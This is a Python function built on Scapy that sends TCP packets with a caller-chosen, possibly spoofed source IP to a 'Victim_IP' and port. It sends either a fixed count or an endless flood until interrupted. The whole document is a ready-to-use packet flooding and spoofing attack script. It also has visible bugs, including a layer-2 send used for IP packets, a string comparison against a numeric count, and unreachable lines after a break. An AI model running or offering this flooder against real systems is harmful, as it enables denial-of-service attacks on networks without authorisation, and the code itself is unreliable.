def Run(*self, Source_IP, Victim_IP, Source_Port, Victim_Port, Count, Message):
    print("Scapy Needs Administrator Permission")
    from scapy.all import sendp as Send
    from scapy.all import IP as ip, TCP as tcp
    import scapy.all
    from time import sleep as Sleep
    from sys import exit as Exit
    i = 0
    if Count != "-1":
        print("Press Ctrl + C To Stop The Process")
        for i in range(0, Count):
            try:
                IP = ip(src=Source_IP, dst=Victim_IP)
                TCP = tcp(sport=Source_Port, dport=Victim_Port)
                Packet = IP / TCP / Message
                Send(Packet)
                print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                    Victim_IP, Source_IP, Source_Port, Victim_Port))
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                break
                Sleep(2)
                Exit(0)
    else:
        print("Press Ctrl + C To Stop The Process")
        i = 0
        while True:
            try:
                IP = ip(src=Source_IP, dst=Victim_IP)
                TCP = tcp(sport=Source_Port, dport=Victim_Port)
                Packet = IP / TCP / Message
                Send(Packet)
                print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                    Victim_IP, Source_IP, Source_Port, Victim_Port))
                i += 1
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                Sleep(2)
                Exit(0)
